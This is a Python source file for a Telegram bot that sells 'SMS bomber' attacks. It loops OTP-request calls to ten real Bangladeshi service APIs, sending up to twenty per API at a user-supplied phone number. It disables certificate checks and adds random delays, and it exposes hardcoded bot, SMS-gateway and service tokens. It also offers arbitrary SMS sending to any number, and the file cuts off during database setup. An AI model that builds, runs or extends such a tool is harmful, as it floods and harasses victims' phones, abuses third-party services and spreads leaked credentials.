import os
import asyncio
import logging
import aiosqlite
import aiohttp
import json
import random
import ssl
import csv
import shutil
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = "8892555423:AAHcUvQgf2Y8byocmHuc9zgNLE-tD52nNL4"
ADMIN_ID = 1967494059
ADMIN_USERNAME = "RobiEntertainment"
OWNER_USERNAME = "RobiEntertainment"
SMS_API_URL = "https://api.paglahost.shop/Custom_SMS/api.php"
SMS_API_KEY = "Shuvo55356"

BASE_DIR = os.path.dirname(__file__)
DATA_DIR = os.path.join(BASE_DIR, "data")
LOGS_DIR = os.path.join(DATA_DIR, "logs")
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(LOGS_DIR, exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

DB_PATH = os.path.join(DATA_DIR, "bot_database.db")
LOG_FILE = os.path.join(LOGS_DIR, f"error_{datetime.now().strftime('%Y%m%d')}.log")

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

API_LIMITS = {"daily_limit": 1000, "per_user_limit": 50, "api_call_interval": 0.8, "max_retries": 3}
CANCEL_FLAG = {}

WORKING_APIS = [
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
    {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
    {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
    {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
]

def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', phone)
    return data

def check_success(text, status):
    if status in [200, 201, 202, 204]:
        return any(w in text.lower() for w in ['success', 'otp', 'sent', 'ok', 'true', '1', 'verified', 'done'])
    return False

async def get_user_status(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT status FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else "active"

async def can_use_api(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        today = datetime.now().strftime('%Y-%m-%d')
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE user_id = ? AND DATE(usage_time) = ?", (user_id, today)) as cur:
            count = await cur.fetchone()
            return count[0] < API_LIMITS["per_user_limit"]

async def track_api_usage(api_name, user_id, success):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO api_stats (api_name, total_calls, total_success, total_failed) VALUES (?,1,?,?) "
                "ON CONFLICT(api_name) DO UPDATE SET total_calls=total_calls+1, total_success=total_success+?, total_failed=total_failed+?, last_used=CURRENT_TIMESTAMP",
                (api_name, 1 if success else 0, 0 if success else 1, 1 if success else 0, 0 if success else 1)
            )
            await db.execute(
                "INSERT INTO user_api_stats (user_id, api_name, total_calls) VALUES (?,?,1) "
                "ON CONFLICT(user_id, api_name) DO UPDATE SET total_calls=total_calls+1, last_used=CURRENT_TIMESTAMP",
                (user_id, api_name)
            )
            await db.execute(
                "INSERT INTO api_usage (api_name, user_id, success) VALUES (?,?,?)",
                (api_name, user_id, 1 if success else 0)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"Track API error: {e}")

async def admin_log(admin_id, action, target_id=None, details=""):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?,?,?,?)",
                (admin_id, action, target_id, details)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"Admin log error: {e}")

async def backup_database():
    while True:
        await asyncio.sleep(21600)
        try:
            backup_file = os.path.join(BACKUP_DIR, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
            shutil.copy2(DB_PATH, backup_file)
            logger.info(f"Backup created: {backup_file}")
        except Exception as e:
            logger.error(f"Backup failed: {e}")

def get_main_keyboard():
    return ReplyKeyboardMarkup(
        [["📨 Send SMS", "💣 SMS Bomber"], ["👤 My Profile", "🎁 Redeem Code"], ["📊 My Stats", "📞 Contact Admin"]],
        resize_keyboard=True
    )

def get_admin_keyboard():
    return ReplyKeyboardMarkup(
        [
            ["💰 Add Credit", "➖ Remove Credit"],
            ["🚫 Ban User", "✅ Unban User"],
            ["📣 Broadcast", "🎟️ Create Code"],
            ["📊 Live Stats", "📈 API Stats"],
            ["👥 Users List", "🏆 Top Users"],
            ["💰 Total Balance", "📋 API List"],
            ["🔄 Reset Limits", "📤 Export Data"],
            ["🗑️ Clear Logs", "📜 Admin Logs"],
            ["⏹ Cancel Bomb", "🔙 Back"]
        ],
        resize_keyboard=True
    )

def get_back_keyboard():
    return ReplyKeyboardMarkup([["🔙 Back"]], resize_keyboard=True)

def get_bombing_keyboard():
    return ReplyKeyboardMarkup([["⏹ Cancel Bomb"]], resize_keyboard=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, username) VALUES (?,?)",
            (user.id, user.username or user.first_name)
        )
        await db.commit()
    if user.id == ADMIN_ID:
        await update.message.reply_text(
            f"👑 Admin Panel\nWelcome {user.first_name}!",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
    else:
        await update.message.reply_text(
            f"🔥 Welcome {user.first_name}!\n💰 Balance: 10 Credits\n📡 APIs: {len(WORKING_APIS)}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

async def check_status(func):
    async def wrapper(update, context, *args, **kwargs):
        if await get_user_status(update.effective_user.id) == "banned":
            await update.message.reply_text("🚫 You are banned!", parse_mode="Markdown")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

@check_status
async def cmd_sms(update, context):
    user_id = update.effective_user.id
    if not await can_use_api(user_id):
        await update.message.reply_text(
            f"❌ Daily limit exceeded! Max: {API_LIMITS['per_user_limit']}/day",
            parse_mode="Markdown"
        )
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance FROM users WHERE user_id=?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < 1:
                await update.message.reply_text(
                    f"❌ Insufficient credits! Contact @{ADMIN_USERNAME}",
                    parse_mode="Markdown",
                    reply_markup=get_main_keyboard()
                )
                return
    await update.message.reply_text(
        "📨 Send SMS\nEnter phone number (11 digits):",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'sms_number'

async def sms_number(update, context):
    number = update.message.text.strip()
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text("❌ Invalid! Enter 11 digits:", reply_markup=get_back_keyboard())
        return
    context.user_data['sms_number'] = number
    context.user_data['state'] = 'sms_message'
    await update.message.reply_text(
        f"✅ Number: `{number}`\nNow enter your message:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def sms_message(update, context):
    user_id = update.effective_user.id
    number = context.user_data.get('sms_number')
    msg = update.message.text
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    await update.message.reply_text(f"⏳ Sending to `{number}`...", parse_mode="Markdown")
    success = False
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                SMS_API_URL,
                params={"key": SMS_API_KEY, "number": number, "msg": msg},
                timeout=30
            ) as resp:
                text = await resp.text()
                if "success" in text.lower():
                    success = True
    except Exception as e:
        logger.error(f"SMS error: {e}")
    if success:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET balance = balance - 1, total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
            await db.commit()
        await update.message.reply_text(
            f"✅ SMS sent to `{number}`!",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    else:
        await update.message.reply_text("❌ Failed to send SMS!", reply_markup=get_main_keyboard())
    context.user_data.clear()

@check_status
async def cmd_bomber(update, context):
    user_id = update.effective_user.id
    if not await can_use_api(user_id):
        await update.message.reply_text(
            f"❌ Daily limit exceeded! Max: {API_LIMITS['per_user_limit']}/day",
            parse_mode="Markdown"
        )
        return
    await update.message.reply_text(
        f"💣 SMS Bomber\nEnter target number (11 digits):\nAPIs: {len(WORKING_APIS)}",
        parse_mode="Markdown",
        reply_markup=get_bombing_keyboard()
    )
    context.user_data['state'] = 'bomber_number'

async def bomber_number(update, context):
    number = update.message.text.strip()
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text("❌ Invalid! Enter 11 digits:", reply_markup=get_bombing_keyboard())
        return
    context.user_data['bomber_number'] = number
    context.user_data['state'] = 'bomber_amount'
    await update.message.reply_text(
        f"✅ Number: `{number}`\nEnter amount per API (1-20):",
        parse_mode="Markdown",
        reply_markup=get_bombing_keyboard()
    )

async def bomber_amount(update, context):
    user_id = update.effective_user.id
    number = context.user_data.get('bomber_number')
    text = update.message.text.strip()
    if text == "⏹ Cancel Bomb":
        CANCEL_FLAG[user_id] = True
        await update.message.reply_text("⏹ Cancelled!", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    try:
        amount = int(text)
        if amount < 1 or amount > 20:
            raise ValueError
    except:
        await update.message.reply_text("❌ Enter a number between 1-20!", reply_markup=get_bombing_keyboard())
        return
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    total_apis = len(WORKING_APIS)
    total_sms = total_apis * amount
    msg = await update.message.reply_text(
        f"⏳ Bombing started!\nTarget: {number}\nTotal: {total_sms}",
        parse_mode="Markdown",
        reply_markup=get_bombing_keyboard()
    )
    success_count = 0
    failed_count = 0
    CANCEL_FLAG[user_id] = False
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_context)
    api_results = []
    async with aiohttp.ClientSession(connector=connector) as session:
        for i, api in enumerate(WORKING_APIS, 1):
            if CANCEL_FLAG.get(user_id, False):
                break
            api_success = 0
            api_failed = 0
            for j in range(amount):
                if CANCEL_FLAG.get(user_id, False):
                    break
                try:
                    body = replace_phone(api['body'], number)
                    headers = {
                        "User-Agent": "Mozilla/5.0",
                        "Accept": "application/json",
                        "Content-Type": "application/json"
                    }
                    await asyncio.sleep(random.uniform(0.8, 1.5))
                    if api['method'] == 'POST':
                        async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
                            if check_success(await resp.text(), resp.status):
                                api_success += 1
                                success_count += 1
                            else:
                                api_failed += 1
                                failed_count += 1
                    else:
                        async with session.get(api['url'], headers=headers, timeout=15) as resp:
                            if resp.status in [200, 201, 202, 204]:
                                api_success += 1
                                success_count += 1
                            else:
                                api_failed += 1
                                failed_count += 1
                except Exception as e:
                    api_failed += 1
                    failed_count += 1
                    logger.error(f"API error: {e}")
                total_done = (i - 1) * amount + (j + 1)
                if total_done % 10 == 0 or total_done == total_sms:
                    try:
                        await msg.edit_text(
                            f"⏳ Bombing... {total_done}/{total_sms}\n✅ {success_count}  ❌ {failed_count}",
                            parse_mode="Markdown",
                            reply_markup=get_bombing_keyboard()
                        )
                    except:
                        pass
            api_results.append({'name': api['name'], 'success': api_success, 'failed': api_failed})
            await track_api_usage(api['name'], user_id, api_success > 0)
    success_rate = round((success_count / total_sms) * 100, 2) if total_sms else 0
    top = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
    top_text = "\n".join([f"{idx+1}. {a['name']}: ✅{a['success']}" for idx, a in enumerate(top) if a['success'] > 0])
    if not top_text:
        top_text = "❌ No success"
    await msg.edit_text(
        f"✅ Bombing Complete!\nTarget: {number}\nSuccess: {success_count}\nFailed: {failed_count}\nRate: {success_rate}%\n\n🏆 Top APIs:\n{top_text}",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    context.user_data.clear()
    CANCEL_FLAG.pop(user_id, None)

@check_status
async def profile(update, context):
    user_id = update.effective_user.id
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT username, balance, total_sms, total_bombing, join_date, status FROM users WHERE user_id=?",
            (user_id,)
        ) as cur:
            row = await cur.fetchone()
    if row:
        await update.message.reply_text(
            f"👤 Profile\nID: {user_id}\nBalance: {row[1]}\nSMS: {row[2]}\nBomb: {row[3]}\nStatus: {row[5]}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

@check_status
async def stats(update, context):
    user_id = update.effective_user.id
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT balance, total_sms, total_bombing FROM users WHERE user_id=?",
            (user_id,)
        ) as cur:
            row = await cur.fetchone()
    if row:
        await update.message.reply_text(
            f"📊 Stats\nBalance: {row[0]}\nSMS: {row[1]}\nBomb: {row[2]}\nAPIs: {len(WORKING_APIS)}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

@check_status
async def redeem(update, context):
    await update.message.reply_text(
        "🎟 Enter redeem code:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'redeem_code'

async def redeem_process(update, context):
    user_id = update.effective_user.id
    code = update.message.text.strip().upper()
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT 1 FROM redeem_history WHERE user_id=? AND code=?", (user_id, code)) as cur:
            if await cur.fetchone():
                await update.message.reply_text("❌ Already used!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
        async with db.execute("SELECT amount, usages FROM redeem_codes WHERE code=?", (code,)) as cur:
            row = await cur.fetchone()
            if not row or row[1] <= 0:
                await update.message.reply_text("❌ Invalid/expired!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
            amount = row[0]
            await db.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (amount, user_id))
            await db.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code=?", (code,))
            await db.execute("INSERT INTO redeem_history (user_id, code) VALUES (?,?)", (user_id, code))
            await db.commit()
    await update.message.reply_text(f"🎉 +{amount} credits!", reply_markup=get_main_keyboard())
    context.user_data.clear()

async def contact(update, context):
    await update.message.reply_text(
        f"📞 Admin: @{ADMIN_USERNAME}",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Message", url=f"https://t.me/{ADMIN_USERNAME}")]
        ])
    )

async def admin_add_credit(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "💰 Add Credit\nFormat: ID AMOUNT",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'add_credit'

async def admin_remove_credit(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "➖ Remove Credit\nFormat: ID AMOUNT",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'remove_credit'

async def admin_ban_user(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "🚫 Ban User\nEnter user ID:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'ban_user'

async def admin_unban_user(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "✅ Unban User\nEnter user ID:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'unban_user'

async def admin_broadcast(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "📣 Broadcast\nSend your message:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'broadcast'

async def admin_create_code(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "🎟️ Create Code\nFormat: CODE AMOUNT USAGES",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'create_code'

async def admin_total_balance(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT SUM(balance), COUNT(*), AVG(balance) FROM users") as cur:
            total, users, avg = await cur.fetchone()
    await update.message.reply_text(
        f"💰 Total Balance\nUsers: {users}\nTotal: {total or 0}\nAvg: {round(avg or 0, 2)}",
        parse_mode="Markdown",
        reply_markup=get_admin_keyboard()
    )

async def admin_top_users(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id, username, balance FROM users ORDER BY balance DESC LIMIT 10") as cur:
            users = await cur.fetchall()
    if not users:
        await update.message.reply_text("No users", reply_markup=get_admin_keyboard())
        return
    text = "🏆 Top 10 Users\n"
    for i, u in enumerate(users, 1):
        text += f"{i}. ID: {u[0]}  💰{u[2]}\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_export_data(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("⏳ Exporting...")
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT * FROM users") as cur:
                users = await cur.fetchall()
        fname = f"users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        with open(fname, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['ID', 'Username', 'Balance', 'SMS', 'Bomb', 'Join', 'Status'])
            writer.writerows(users)
        await update.message.reply_document(
            document=open(fname, 'rb'),
            caption="📤 Export",
            reply_markup=get_admin_keyboard()
        )
        os.remove(fname)
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=get_admin_keyboard())

async def admin_reset_limits(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    global API_LIMITS
    API_LIMITS = {"daily_limit": 1000, "per_user_limit": 50, "api_call_interval": 0.8, "max_retries": 3}
    await update.message.reply_text("🔄 Limits reset!", parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_clear_logs(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM admin_logs")
        await db.commit()
    await update.message.reply_text("🗑️ Logs cleared!", reply_markup=get_admin_keyboard())

async def admin_logs(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT admin_id, action, target_id, details, log_time FROM admin_logs ORDER BY log_time DESC LIMIT 20"
        ) as cur:
            logs = await cur.fetchall()
    if not logs:
        await update.message.reply_text("No logs", reply_markup=get_admin_keyboard())
        return
    text = "📜 Admin Logs\n"
    for log in logs:
        text += f"{log[4][:16]} {log[1]}"
        if log[2]:
            text += f" (Target: {log[2]})"
        text += "\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_live_stats(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT COUNT(*) FROM api_usage") as cur:
            total_calls = await cur.fetchone()
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time)=DATE('now')") as cur:
            today_calls = await cur.fetchone()
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE success=1") as cur:
            total_success = await cur.fetchone()
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE success=0") as cur:
            total_failed = await cur.fetchone()
        async with db.execute("SELECT api_name, total_success, total_failed FROM api_stats ORDER BY total_success DESC LIMIT 5") as cur:
            top = await cur.fetchall()
        async with db.execute("SELECT COUNT(DISTINCT user_id) FROM api_usage WHERE usage_time > datetime('now','-1 hour')") as cur:
            active = await cur.fetchone()
    text = (
        f"📊 LIVE STATS\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"Total Calls: {total_calls[0]}\nToday: {today_calls[0]}\nActive (1h): {active[0]}\n"
        f"✅ {total_success[0]}  ❌ {total_failed[0]}\n\n🏆 Top 5 APIs:\n"
    )
    for i, a in enumerate(top, 1):
        total = a[1] + a[2]
        rate = round((a[1] / total) * 100, 2) if total else 0
        text += f"{i}. {a[0]}: ✅{a[1]} ❌{a[2]} ({rate}%)\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_api_stats(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT api_name, total_calls, total_success, total_failed, last_used FROM api_stats ORDER BY total_calls DESC"
        ) as cur:
            apis = await cur.fetchall()
    if not apis:
        await update.message.reply_text("No stats", reply_markup=get_admin_keyboard())
        return
    text = "📈 API Stats\n"
    for api in apis[:15]:
        rate = round((api[2] / api[1]) * 100, 2) if api[1] else 0
        text += f"{api[0]}: Calls={api[1]} ✅{api[2]} ❌{api[3]} ({rate}%)\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_users_list(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id, username, balance, status FROM users ORDER BY user_id DESC LIMIT 20") as cur:
            users = await cur.fetchall()
    if not users:
        await update.message.reply_text("No users", reply_markup=get_admin_keyboard())
        return
    text = "👥 Recent Users\n"
    for u in users:
        text += f"ID: {u[0]}  💰{u[2]}  {u[3]}\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_api_list(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    text = f"📡 APIs: {len(WORKING_APIS)}\n" + "\n".join([f"{i+1}. {a['name']}" for i, a in enumerate(WORKING_APIS)])
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_cancel_bomb(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    CANCEL_FLAG[update.effective_user.id] = True
    await update.message.reply_text("⏹ Cancelled by admin!", reply_markup=get_admin_keyboard())

async def admin_state_handler(update, context):
    user_id = update.effective_user.id
    msg = update.message.text
    state = context.user_data.get('admin_state')
    if state == 'add_credit':
        try:
            target, amount = map(int, msg.split())
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target))
                await db.commit()
            try:
                await context.bot.send_message(target, f"🎉 +{amount} credits added!")
            except:
                pass
            await admin_log(user_id, "Added Credit", target, f"{amount}")
            await update.message.reply_text(f"✅ Added {amount} to {target}", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ Invalid! Use: ID AMOUNT", parse_mode="Markdown")
        context.user_data['admin_state'] = None
    elif state == 'remove_credit':
        try:
            target, amount = map(int, msg.split())
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target))
                await db.commit()
            try:
                await context.bot.send_message(target, f"⚠️ -{amount} credits removed!")
            except:
                pass
            await admin_log(user_id, "Removed Credit", target, f"{amount}")
            await update.message.reply_text(f"✅ Removed {amount} from {target}", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ Invalid! Use: ID AMOUNT", parse_mode="Markdown")
        context.user_data['admin_state'] = None
    elif state == 'ban_user':
        try:
            target = int(msg.strip())
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET status = 'banned' WHERE user_id = ?", (target,))
                await db.commit()
            try:
                await context.bot.send_message(target, "🚫 You are banned!")
            except:
                pass
            await admin_log(user_id, "Banned User", target)
            await update.message.reply_text(f"🚫 User {target} banned", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ Invalid ID!")
        context.user_data['admin_state'] = None
    elif state == 'unban_user':
        try:
            target = int(msg.strip())
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET status = 'active' WHERE user_id = ?", (target,))
                await db.commit()
            try:
                await context.bot.send_message(target, "✅ You are unbanned!")
            except:
                pass
            await admin_log(user_id, "Unbanned User", target)
            await update.message.reply_text(f"✅ User {target} unbanned", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ Invalid ID!")
        context.user_data['admin_state'] = None
    elif state == 'broadcast':
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id FROM users WHERE status='active'") as cur:
                users = await cur.fetchall()
        await update.message.reply_text(f"⏳ Broadcasting to {len(users)} users...")
        success = 0
        for u in users:
            try:
                await context.bot.send_message(u[0], f"📢 Broadcast\n\n{msg}", parse_mode='Markdown')
                success += 1
                await asyncio.sleep(0.05)
            except:
                pass
        await admin_log(user_id, "Broadcast", None, f"Sent to {success}")
        await update.message.reply_text(f"✅ Broadcast sent to {success} users!", reply_markup=get_admin_keyboard())
        context.user_data['admin_state'] = None
    elif state == 'create_code':
        try:
            parts = msg.split()
            code, amount, usages = parts[0].upper(), int(parts[1]), int(parts[2])
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("INSERT INTO redeem_codes (code, amount, usages, created_by) VALUES (?,?,?,?)", (code, amount, usages, user_id))
                await db.commit()
            await admin_log(user_id, "Created Code", None, f"{code}: {amount}x{usages}")
            await update.message.reply_text(f"✅ Code created!\n{code}\n{amount} credits\n{usages} uses", reply_markup=get_admin_keyboard())
        except:
            await update.message.reply_text("❌ Invalid! Use: CODE AMOUNT USAGES", parse_mode="Markdown")
        context.user_data['admin_state'] = None

async def handle_message(update, context):
    user_id = update.effective_user.id
    msg = update.message.text
    logger.info(f"📩 {user_id}: {msg}")
    if user_id == ADMIN_ID:
        if msg == "⏹ Cancel Bomb":
            await admin_cancel_bomb(update, context)
            return
        if msg == "💰 Add Credit":
            await admin_add_credit(update, context)
            return
        if msg == "➖ Remove Credit":
            await admin_remove_credit(update, context)
            return
        if msg == "🚫 Ban User":
            await admin_ban_user(update, context)
            return
        if msg == "✅ Unban User":
            await admin_unban_user(update, context)
            return
        if msg == "📣 Broadcast":
            await admin_broadcast(update, context)
            return
        if msg == "🎟️ Create Code":
            await admin_create_code(update, context)
            return
        if msg == "💰 Total Balance":
            await admin_total_balance(update, context)
            return
        if msg == "🏆 Top Users":
            await admin_top_users(update, context)
            return
        if msg == "📤 Export Data":
            await admin_export_data(update, context)
            return
        if msg == "🔄 Reset Limits":
            await admin_reset_limits(update, context)
            return
        if msg == "🗑️ Clear Logs":
            await admin_clear_logs(update, context)
            return
        if msg == "📜 Admin Logs":
            await admin_logs(update, context)
            return
        if msg == "📊 Live Stats":
            await admin_live_stats(update, context)
            return
        if msg == "📈 API Stats":
            await admin_api_stats(update, context)
            return
        if msg == "👥 Users List":
            await admin_users_list(update, context)
            return
        if msg == "📋 API List":
            await admin_api_list(update, context)
            return
        if msg == "🔙 Back":
            await update.message.reply_text("Main Menu", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        if context.user_data.get('admin_state'):
            await admin_state_handler(update, context)
            return
    if msg == "🔙 Back":
        await update.message.reply_text("Main Menu", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    if msg == "📨 Send SMS":
        await cmd_sms(update, context)
        return
    if msg == "💣 SMS Bomber":
        await cmd_bomber(update, context)
        return
    if msg == "👤 My Profile":
        await profile(update, context)
        return
    if msg == "🎁 Redeem Code":
        await redeem(update, context)
        return
    if msg == "📊 My Stats":
        await stats(update, context)
        return
    if msg == "📞 Contact Admin":
        await contact(update, context)
        return
    state = context.user_data.get('state')
    if state == 'sms_number':
        await sms_number(update, context)
        return
    elif state == 'sms_message':
        await sms_message(update, context)
        return
    elif state == 'bomber_number':
        await bomber_number(update, context)
        return
    elif state == 'bomber_amount':
        await bomber_amount(update, context)
        return
    elif state == 'redeem_code':
        await redeem_process(update, context)
        return
    await update.message.reply_text("❌ Use buttons!", reply_markup=get_main_keyboard())

async def init_db():
    try:
        async with aiosqlite.connect(DB_PATH) as db:
